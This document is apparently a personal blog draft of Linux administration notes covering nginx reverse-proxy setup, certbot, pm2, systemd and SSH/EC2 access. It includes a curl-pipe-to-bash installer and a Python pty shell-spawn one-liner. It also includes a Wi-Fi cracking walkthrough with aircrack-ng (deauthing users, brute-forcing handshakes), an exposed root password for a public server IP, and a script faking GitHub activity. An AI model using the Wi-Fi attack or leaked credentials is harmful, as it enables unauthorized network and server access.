---
title: "My First Post"
date: 2023-08-13T11:32:57+08:00
draft: true
---

# Linux Config / Setup

### **NGINX Setup / Reverse Proxy**

1. xargs command

   - reads stream of data from standard input

2.

3. ```
   python contribute.py --max_commits=3 --frequency=50 --days_before=15 --days_after=5 --repository=git@github.com:syamil24/github-acitivity.git
   ```

4. ``` bash
   sudo apt-get install nginx
   sudo apt-get install software-properties-common
   curl -o- https://raw.githubusercontent.com/vinyll/certbot-install/master/install.sh | bash
   ```

5. Inside ./etc/nginx/sites-available, paste this one

6. ```
   server {
     server_name *.syamilthoughts.com;
       listen 443 ssl; # managed by Certbot
       ssl_certificate /etc/letsencrypt/live/syamilthoughts.com/fullchain.pem; # managed by Certbot
       ssl_certificate_key /etc/letsencrypt/live/syamilthoughts.com/privkey.pem; # managed by Certbot
       include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
       ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot
   }

   server {
     server_name syamilthoughts.com;
       listen 443 ssl; # managed by Certbot
       ssl_certificate /etc/letsencrypt/live/syamilthoughts.com-0001/fullchain.pem; # managed by Certbot
       ssl_certificate_key /etc/letsencrypt/live/syamilthoughts.com-0001/privkey.pem; # managed by Certbot
       include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
       ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot
   }

   server {

     listen 443 ssl;
     server_name musicapp.syamilthoughts.com;

      location / {
       proxy_pass http://localhost:8080;
   #    proxy_http_version 1.1;
   #    proxy_set_header Upgrade $http_upgrade;
   #    proxy_set_header Connection 'upgrade';
   #    proxy_set_header Host $host;
   #    proxy_cache_bypass $http_upgrade;
     }
   }

   server {

     listen 443 ssl;

     server_name grafana.syamilthoughts.com;

      location / {
       proxy_pass http://localhost:3000;
    #   proxy_http_version 1.1;
    #   proxy_set_header Upgrade $http_upgrade;
    #   proxy_set_header Connection 'upgrade';
    #   proxy_set_header Host $host;
    #   proxy_cache_bypass $http_upgrade;
     }
   }


   server {
       if ($host = *.syamilthoughts.com) {
           return 301 https://$host$request_uri;
       } # managed by Certbot


       if ($host = syamilthoughts.com) {
           return 301 https://$host$request_uri;
       } # managed by Certbot

     listen 80;
     server_name *.syamilthoughts.com;
       return 404; # managed by Certbot
   }

   ```

7. ```bash
   # To provide symlink between both file
   sudo ln -s /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default
   sudo service nginx restart
   sudo fuser -k 80/tcp
   sudo service nginx start
   ```

8. Reset NGINX

   ```bash
   sudo apt-get purge nginx nginx-common nginx-full
   sudo apt-get install nginx
   ```

9. Certbot for SSL Installation

   ```bash
   sudo certbot -d *.syamilthoughts.com --manual certonly
   sudo certbot --nginx -d syamilthoughts.com
   ```

10. Renew Certificate

    ```bash
    sudo certbot certonly --manual --preferred-challenges dns
    ```



11. Nginx is default user is www-data, make sure all directory for a web is using that user name except for those using proxy

12. NginX basic commands

   ```bash
sudo nano  /etc/nginx/sites-enabled/default
cat /var/log/nginx/error.log
cat /etc/nginx/nginx.conf
cat /var/log/nginx/access.log
sudo nginx -t => check if config files is written correctly
   ```

11.

### **Others Commands**

1. PM2 start app with ecosystem.config.cjs, in this case its VueJS

   ``` bash
   pm2 start npm run serve --name "My Music App"
   ```

2. Monitor service

   ```bash
   sudo systemctl status nginx.service
   sudo systemctl status nginx
   ```

3. Start/Stop Service (2ways)

   - Notes

     > restart - stop service and restart everything
     >
     > reload - only few services supported, only re-read config files, does not stop the service

   ```bash
   sudo service grafana-server start
   sudo service grafana-server stop
   sudo systemctl start grafana-server
   sudo systemctl stop grafana-server
   sudo systemctl reload grafana-server
   sudo systemctl restart grafana-server
   ```

4. pstree

5. VueJS run command

   ```bash
   export NODE_OPTIONS=--openssl-legacy-provider
   nohup npm run server 2>&1 &
   ```

6. Run Program on Startup

   ```bash
   sudo systemctl is-enabled grafana-server
   sudo systemctl enable grafana
   ```

7. Ways to run shell script:

   -  ./FILENAME.SH
   -  bash FILENAME.SH
   -  source FILENAME.SH

8. CR LF - Carriage Return Line Feeding

   - To indicate end of line in Windows

9. Fix command not found in linux using VIM/VI

   -  `:set ff=unix`

10. Export PATH in Linux

   - export PATH=$PATH:/YOUR_PATH/

11. rsync vs scp

    - rsync use delta transfer algorithm which optimizes the file that you re sending. It will compare few things such as timestamp, file size etc to find a duplicate files and ignore it.
    - rsync has a lot of options/commands than scp
    - scp transfer file in a secure manner

12. Linode SSH

       - `ssh root@192.53.116.128`

       - password - madlim123

13. **%s** in shell

    - print in string format

14. AWS Southeast EC2

    ```bash
    D:
    cd D:\Downloads\AWS EC2 Private Key FIle
    ssh -i "sgKey.pem" ubuntu@ec2-18-143-115-58.ap-southeast-1.compute.amazonaws.com
    scp -i ./sgKey.pem "D:/Intern/Syamil Job Application/Maybank/Maybank Job/digital-productivity-client/*"  ubuntu@ec2-18-143-115-58.ap-southeast-1.compute.amazonaws.com:/home/ubuntu/productivity

    ### Inside ec2 instance
    cd mbb-tappy-bot
    git pull origin main
    pm2 restart tappy-prod
    ```

15. pgrep, fgrep, grep, egrep

    - grep = Global Regular Expressions

    - egrep - Extended Regular Expression
    - fgrep - will take all inputs as string, no regex expression in it
    - pgrep - find process id

16. Build Docker using Maven

    ```
    mvn clean package dockerfile:push -DskipTests
    ```



17. Start shell using python

``` python
python -c 'import pty;pty.spawn("/bin/bash")'
```

17. Linux Monitor Resource Usage

    ``` bash
    free -m -s 5  => View Memory Usage every 5 secs in MB
    cat /proc/meminfo => View current memory information
    mpstat 5 => View CPU Usage Every 5 seconds
    cat /proc/cpuinfo => View CPU Information
    top => View Memory Usage
    ps -aux --sort %mem => sort by memory usage every processes
    vmstat -S m 5 => view memory usage every 5 seconds in MB
    ```

18. Enable root login over SSH

    ```bash
    nano /etc/ssh/sshd_config
    type `PermitRootLogin yes`
    sudo service sshd restart
    ```

19. Wifi Hacking Kali Linux

    ```bash
    - iwconfig => list out network / wifi interfaces
    - airmon-ng => list out wifi interfaces and test if airmon install or not
    - airmon-ng start wlan0 => start monitor monitor mode using wlan0 interface
    - airodump-ng wlan0mon => capture all available wifi / AP
    - airodump-ng -w hack1 -c 2 -bssid YOUR_WIFI_SSID_HERE wlan0mon => capture handshake from that Wifi SSID and save to hack1.cap file
    - aireplay-ng -deauth 0 -a USER_MAC_ADDRESS_HERE wlan0mon => deauth user to get full handshake connection
    - wireshark hack1.cap = open cap file in wireshark
    - aircrack-ng hack1.cap -w /usr/share/wordlists/rockyou.txt => brute force wifi password using rockyou wordlist
    - airmon-ng stop wlan0mon => revert back wifi interface to normal mode
    ```

20. POST Request with CURL

    - Explanation
      - -k for insecure, to bypass SSL cert
      - -H for adding header
      - -X for request type (GET, POST etc)
      - -d for data or requestBody

    ```bash
    curl -k -X POST -H "Content-Type: application/json" -H "Accept-Charset: utf-8" -d '{"requestPayload": {"emplNo" : "123456567"}}' https:yourUrl.com
    ```



21. Generating SSH Key-Pair (To ensure SSH without password)

    - Note to myself => Public key need to be generated from the host(Windows 10) and paste it in the server

    ```bash
    #IN Windows 10
    ssh-keygen
    chmod 700 ~/.ssh
    move id_rsa.pub to Linux Server

    #In Linux
    ls -l ~/.ssh/id* => Check for existing key pairs
    cat /etc/ssh/sshd_config => set 'PubKeyAuthentication yes', set 'PasswordAuthentication no' and uncoment 'PermitRootLogin yes'
    ssh -i root@192.168.0.197
    ```



### **Bash Course**

1. `cat /etc/shells`

   - display all shells available in the system

2. `which bash`

3.

